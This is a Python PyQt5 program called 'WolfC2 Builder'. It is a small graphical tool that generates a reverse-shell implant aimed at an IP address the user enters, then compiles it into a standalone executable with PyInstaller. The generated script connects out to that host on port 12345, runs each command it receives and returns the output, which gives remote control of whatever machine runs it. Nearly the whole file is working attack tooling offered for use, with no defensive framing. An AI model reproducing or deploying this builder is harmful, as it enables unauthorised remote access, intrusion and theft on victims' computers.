import sys
import subprocess
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox

class WolfC2BuilderApp(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("WolfC2 Builder")

        layout = QVBoxLayout()
        self.label = QLabel("Enter the IP address:")
        self.ip_input = QLineEdit()
        self.generate_button = QPushButton("Generate Script")

        self.setStyleSheet(
            "background-color: black; color: red; font-size: 16px; border: 2px solid red;"
        )

        self.generate_button.clicked.connect(self.generate_script)

        layout.addWidget(self.label)
        layout.addWidget(self.ip_input)
        layout.addWidget(self.generate_button)

        self.setLayout(layout)

    def generate_script(self):
        user_ip = self.ip_input.text()

        if not user_ip:
            QMessageBox.warning(self, "Error", "Please enter an IP address.")
            return

        script_template = f'''
import socket
import subprocess

# Set up a client to connect to the server
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('{user_ip}', 12345))  # Replace with your server's IP and port

while True:
    command = client.recv(4096).decode()

    if command.lower() == 'exit':
        break

    output = subprocess.getoutput(command)
    client.send(output.encode())

client.close()
'''

        with open('generated_script.py', 'w') as generated_file:
            generated_file.write(script_template)

        QMessageBox.information(self, "Script Generated", "Script generation complete.")

        self.convert_button = QPushButton("Convert to Executable")
        self.convert_button.clicked.connect(self.convert_to_executable)
        self.layout().addWidget(self.convert_button)

    def convert_to_executable(self):
        try:
            subprocess.run(["pyinstaller", "--onefile", "generated_script.py"])
            QMessageBox.information(self, "Conversion Complete", "Script successfully converted to an executable.")
        except Exception as e:
            QMessageBox.critical(self, "Conversion Error", f"An error occurred during conversion: {str(e)}")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = WolfC2BuilderApp()
    window.show()
    sys.exit(app.exec_())
